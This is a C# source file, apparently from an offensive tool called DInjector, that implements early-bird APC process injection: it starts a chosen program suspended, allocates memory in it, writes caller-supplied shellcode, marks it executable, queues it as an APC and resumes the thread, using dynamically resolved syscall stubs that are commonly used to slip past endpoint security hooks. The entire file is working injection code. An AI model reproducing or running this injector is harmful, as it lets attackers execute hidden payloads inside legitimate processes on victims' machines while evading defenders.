using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadAPC
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Boolean CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            DI.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtOpenThread(
            ref IntPtr ThreadHandle,
            DI.Data.Win32.Kernel32.ThreadAccess dwDesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAlertResumeThread(
            IntPtr ThreadHandle,
            ref uint SuspendCount);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        public static void Execute(byte[] shellcodeBytes, string processImage)
        {
            var shellcode = shellcodeBytes;

            #region CreateProcessA

            IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));

            DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO si = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO();
            DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            bool result = dCreateProcess(
                processImage,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (result)
            {
                Console.WriteLine("(Module) [+] CreateProcess");
            }
            else
            {
                Console.WriteLine("(Module) [-] CreateProcess");
            }

            #endregion

            #region NtAllocateVirtualMemory

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtWriteVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtWriteVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
            }

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            uint oldProtect = 0;

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtOpenThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenThread");
            NtOpenThread sysNtOpenThread = (NtOpenThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenThread));

            IntPtr hThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };

            ntstatus = sysNtOpenThread(
                ref hThread,
                DI.Data.Win32.Kernel32.ThreadAccess.SetContext,
                ref oa,
                ref ci);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtOpenThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtOpenThread: {ntstatus}");
            }

            #endregion

            #region NtQueueApcThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueueApcThread");
            NtQueueApcThread sysNtQueueApcThread = (NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueueApcThread));

            ntstatus = sysNtQueueApcThread(
                hThread,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtQueueApcThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtQueueApcThread: {ntstatus}");
            }

            #endregion

            #region NtAlertResumeThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAlertResumeThread");
            NtAlertResumeThread sysNtAlertResumeThread = (NtAlertResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAlertResumeThread));
            
            uint suspendCount = 0;

            ntstatus = sysNtAlertResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtAlertResumeThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtAlertResumeThread: {ntstatus}");
            }

            #endregion
        }
    }
}
